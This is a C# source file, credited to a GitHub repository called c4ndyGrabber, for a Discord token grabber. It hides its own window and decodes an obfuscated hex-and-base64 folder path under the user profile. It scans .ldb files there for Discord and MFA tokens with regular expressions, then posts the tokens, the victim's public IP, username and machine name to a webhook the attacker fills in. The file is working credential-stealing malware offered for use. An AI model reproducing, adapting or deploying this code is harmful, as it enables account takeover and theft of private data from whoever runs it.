//from https://github.com/Nyxonn/c4ndyGrabber/blob/master/candy-grabber/Program.cs

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Saturn
{
    internal static class saturn
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        // If you want to use this make sure to build it as "Release" to remove debug console logging
        private static readonly string webhook = "%%URL%%"; // Your webhook goes here
        
        internal static void Main()
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);
            var msg = GetThem();
            if (msg.Count > 0) SendMeResults(msg);
            
        }

        private static List<string> GetThem()
        {
            List<string> discordTokens = new List<string>();
            DirectoryInfo[] rootFolders =
            {
                
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) +
                                  "584546776345526864474663556d396862576c755a31786b61584e6a62334a6b584578765932467349464e3062334a685a325663624756325a57786b59673d3d"
                                      .FromHex().FromBase64()),

            };

            foreach (var rootFolder in rootFolders)
            {
                foreach (var file in rootFolder.GetFiles("*.ldb"))
                {
                    string readFile = file.OpenText().ReadToEnd();

                    foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        discordTokens.Add(match.Value);

                    foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                        discordTokens.Add(match.Value);
                }
            }


            discordTokens = discordTokens.Distinct().ToList();
            

            return discordTokens;
        }

        private static string GetIp()
        {
            using (WebClient c = new WebClient())
            {
                string ip = c.DownloadString("http://api.ipify.org");
                return ip;
            }
        }

        private static void SendMeResults(List<string> message)
        {
            Post(webhook, new NameValueCollection
            {
                {
                    "adresse", GetIp()
                }
,
                {
                    "token", string.Join("!n", message)
                   
                },

                {
                    "session_name",Environment.UserName
                },

                {
                    "pc_name", Environment.MachineName

                }

            }) ;

            Environment.Exit(0);
        }

        private static void Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
            {
                webClient.UploadValues(uri, pairs);
            }

        }

        private static string FromBase64(this string base64)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64));
        }

        private static string FromHex(this string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++) bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return Encoding.UTF8.GetString(bytes);
        }
    }
}
